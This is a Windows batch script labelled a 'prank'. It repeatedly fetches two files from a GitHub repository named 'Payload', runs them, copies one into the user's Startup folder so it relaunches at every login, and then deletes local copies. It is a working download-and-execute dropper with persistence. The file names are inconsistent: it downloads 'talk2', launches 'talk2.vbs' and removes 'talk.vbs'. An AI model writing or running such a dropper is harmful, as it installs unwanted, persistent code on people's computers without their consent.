@echo off
setlocal

:: Define retry delay (in seconds)
set "retryDelay=5"

:: Download talk2
set "urlTalk2=https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk2"
set "fileTalk2=talk2"
:retryTalk2
curl -O "%urlTalk2%"
if not exist "%fileTalk2%" (
    echo [Retry] Failed to download %fileTalk2%. Retrying in %retryDelay% seconds...
    timeout /t %retryDelay% > nul
    goto retryTalk2
)
echo [OK] Downloaded %fileTalk2%

:: Download startexc.bat
set "urlStart=https://raw.githubusercontent.com/DanielNov2014/Payload/main/startexc.bat"
set "fileStart=startexc.bat"
:retryStart
curl -O "%urlStart%"
if not exist "%fileStart%" (
    echo [Retry] Failed to download %fileStart%. Retrying in %retryDelay% seconds...
    timeout /t %retryDelay% > nul
    goto retryStart
)
echo [OK] Downloaded %fileStart%

:: Execute prank
timeout /t 10 > nul
start "" startexc.bat
start "" talk2.vbs

:: Wait and check process
timeout /t 3 > nul
tasklist | findstr /i "wscript.exe" > nul
if errorlevel 1 (
    echo [Warning] talk2.vbs may not have started properly.
)

:: Copy to Startup folder for auto-launch
set "startupPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

copy /y startexc.bat "%startupPath%\startexc.bat"
echo [OK] startexc.bat added to Startup folder 😈

:: Cleanup
timeout /t 5 > nul
if exist talk.vbs (
    del /f /q "talk.vbs"
    echo Deleted talk.vbs
)
if exist startexc.bat (
    del /f /q "startexc.bat"
    echo Deleted startexc.bat
)

echo Done. All files downloaded, executed, and cleaned up. 🎭
endlocal
